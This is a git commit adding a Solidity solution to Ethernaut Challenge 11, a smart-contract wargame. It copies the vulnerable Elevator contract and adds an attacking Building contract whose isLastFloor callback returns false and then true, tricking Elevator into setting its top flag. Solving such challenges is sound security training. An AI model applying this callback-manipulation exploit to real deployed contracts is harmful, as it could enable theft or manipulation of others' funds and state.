97de243b7e68c3a6c361d6b32409ab25d1ed101c
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-07-23 06:33:21 +0200

    Update Solution.sol

--- Ethernaut Challenge 11/Solution.sol
+++ Ethernaut Challenge 11/Solution.sol
@@ -1,1 +1,41 @@
 
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+/* 
+interface Building {
+  function isLastFloor(uint) external returns (bool);
+} */
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}
+
+
+contract Building {
+
+    bool public alreadyCalled = false;
+
+    function isLastFloor(uint floor) external returns(bool){
+        if(!alreadyCalled){
+            alreadyCalled = true;
+            return false;
+        }
+        return true;
+    }
+
+    function callElevator(address addressOfElevator) public {
+        Elevator elevatorContract = Elevator(addressOfElevator);
+        elevatorContract.goTo(2);
+    }
+}
